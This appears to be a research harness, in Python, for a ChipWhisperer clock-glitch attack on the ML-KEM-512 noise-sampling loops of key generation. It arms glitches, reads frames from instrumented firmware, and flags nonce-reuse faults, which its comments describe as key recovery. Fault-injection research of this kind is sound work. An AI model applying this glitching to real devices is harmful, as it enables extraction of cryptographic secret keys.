"""Harness for Valsaraj, Ravi, Bhasin, Wu 2025 (ePrint 2025/2009), add-skip variant.
Monitored region: the ML-KEM-512 noise-sampling loops of indcpa_keypair(), i.e.
four poly_getnoise_eta1() calls off ONE shared seed separated only by nonce++."""
import collections
import time
import chipwhisperer as cw

HUSKY_SN = '50203220573555303030343235323038'
PS       = 4592
MAGIC    = 0x534C4156
FRAME    = 32
NPOLY    = 4
SEL      = 1
CMD      = 's'      # firmware also answers on 'g' and 'k'; see main()

def connect():
    scope = cw.scope(sn=HUSKY_SN)
    scope.default_setup()
    target = cw.target(scope, cw.targets.SimpleSerial2)
    scope.clock.clkgen_freq = 7370000
    target.baud = 230400
    scope.glitch.enabled     = True
    scope.glitch.clk_src     = 'pll'
    scope.glitch.output      = 'clock_xor'
    scope.glitch.trigger_src = 'ext_single'
    scope.io.hs2             = 'glitch'
    time.sleep(0.2); target.flush()
    return scope, target

def reboot(scope, target):
    scope.io.nrst = 'low';    time.sleep(0.05)
    scope.io.nrst = 'high_z'; time.sleep(0.10)
    target.flush()

def arm_glitch(scope, ext_offset, width, offset, repeat=1):
    scope.glitch.ext_offset = ext_offset
    scope.glitch.repeat     = repeat
    scope.glitch.width      = width
    scope.glitch.offset     = offset
    scope.arm()

def run_once(scope, target, glitch=None, sel=SEL, cmd=None):
    if glitch is not None:
        arm_glitch(scope, *glitch)
    target.simpleserial_write(cmd or CMD, bytearray([sel & 0xFF, (sel >> 8) & 0xFF,
                                              (sel >> 16) & 0xFF, (sel >> 24) & 0xFF]))
    rb = target.simpleserial_read('r', FRAME, timeout=600)
    if glitch is not None:
        scope.capture()
    return parse(rb)

def _u16(b, o): return b[o] | (b[o+1] << 8)
def _u32(b, o): return b[o] | (b[o+1] << 8) | (b[o+2] << 16) | (b[o+3] << 24)

def parse(rb):
    if rb is None:          return 'NOFRAME'
    b = bytes(rb)
    if len(b) < FRAME:      return 'SHORTFRAME'
    if _u32(b, 0) != MAGIC: return 'BADMAGIC'
    cyc = _u32(b, 8)
    if cyc < 100 or cyc > 2000000:
        return 'BAD_COUNTERS'
    return dict(sel=_u32(b, 4), cyc=cyc, cpi=b[12], lsu=b[13], fold=b[14],
                nonce=b[15], shift=_u16(b, 16), nok=b[18], ndup=b[19],
                fdup=b[20], dirty=b[21], nsent=b[22], npoly=b[23],
                mck=_u32(b, 24), mh0=_u32(b, 28))

def safe(d, base_cyc=0):
    if isinstance(d, dict): return d
    return dict(sel=0, cyc=base_cyc, cpi=0, lsu=0, fold=0, nonce=NPOLY,
                shift=0x3210, nok=NPOLY, ndup=0, fdup=0xFF, dirty=0, nsent=0,
                npoly=NPOLY, mck=0, mh0=0,
                _bad=('NOFRAME' if not d else 'BADFRAME:' + str(d)))

def fingerprint(d): return (d['cyc'], d['cpi'], d['lsu'], d['fold'])

def nibbles(shift):
    """shift[j] = reference nonce that polynomial j actually came from, 0xF = none."""
    return [(shift >> (4 * j)) & 0xF for j in range(NPOLY)]

CLEAN_SHIFT = sum(j << (4 * j) for j in range(NPOLY))            # 0x3210

# Derived from the objdump of sample_noise(), not from the paper's pseudocode.
# gcc resets the nonce to the constant k at the loop-1 exit (uxtb r4,r5 /
# mov r2,r4) and constant-folds g_nonce_end to 2*k (lsls r4,r4,#1 / strb.w),
# so nonce_end is NOT a witness.  The shift word is the witness: nibble j says
# which reference nonce polynomial j was expanded from.
POLYNAME = ['s0', 's1', 'e0', 'e1']

def matched(d):
    """The reference nonce each emitted polynomial came from, 0xF = none."""
    return nibbles(d['shift'])

def duplicate_pairs(d):
    """Polynomial positions that share a reference nonce, i.e. that are
    bit-exact copies of each other.  THIS is the Valsaraj condition: two
    polynomials expanded from the same (seed, nonce) pair.  The direction of
    the shift is irrelevant -- [0,2,2,3] (s1==e0) is as much a reuse as
    [0,0,2,3] (s1==s0), which is what an earlier version of this test missed."""
    nb = matched(d)
    if 0xF in nb: return []
    seen = collections.defaultdict(list)
    for j, v in enumerate(nb): seen[v].append(j)
    return [tuple(v) for v in seen.values() if len(v) > 1]

def reuse_tag(d):
    return ','.join('=='.join(POLYNAME[j] for j in reversed(p))
                    for p in duplicate_pairs(d))

def classify(d):
    if not isinstance(d, dict): return str(d) if d else 'NOFRAME'
    if d.get('_bad'):           return d['_bad']
    if d['dirty'] & 2:          return 'OVERRUN'               # unscorable
    if d['dirty'] & 1:          return 'SEED_DIRTY'            # unscorable
    if d['nsent']:
        return f"POLY_MISSING(n={d['nsent']},shift=0x{d['shift']:04X})"
    nb = matched(d)
    if 0xF in nb:
        return (f"POLY_CORRUPT(n={nb.count(0xF)},first={nb.index(0xF)},"
                f"shift=0x{d['shift']:04X})")
    dups = duplicate_pairs(d)
    if dups:                                                   # <-- the attack
        return f"NONCE_REUSE[{reuse_tag(d)}](shift=0x{d['shift']:04X})"
    if d['nonce'] != 2 * (NPOLY // 2):
        return f"NONCE_END_BAD(ne={d['nonce']},shift=0x{d['shift']:04X})"
    if all(v == j for j, v in enumerate(nb)):
        return 'normal'
    return f"NONCE_PERM(shift=0x{d['shift']:04X},nok={d['nok']})"

def corrupt_key(d):
    """The emitted key differs from the correct one -> positive for the matrix."""
    return (isinstance(d, dict) and not d.get('_bad') and not d['dirty']
            and (d['nok'] != NPOLY or d['nsent'] != 0))

def unscorable(d):
    """SEED_DIRTY: the post-window reference was built from a moved seed.
    OVERRUN: the sampling loop wrote past the four polynomials."""
    return not isinstance(d, dict) or d.get('_bad') or d['dirty'] != 0

def leaks_key(d):
    """Valsaraj condition: two noise polynomials expanded from the same
    (seed, nonce) pair.  Any such collision is key recovery -- s1==s0 or
    s1==e0 collapses a dimension of the secret, e1==e0 gives two LWE samples
    with the same error, e1==s1 puts a secret polynomial in the error term."""
    if unscorable(d): return False
    return bool(duplicate_pairs(d))

def first_bad_poly(d):
    """Which polynomial index first deviates -- locates the ext window."""
    nb = nibbles(d['shift'])
    for j in range(NPOLY):
        if nb[j] != j: return j
    return -1
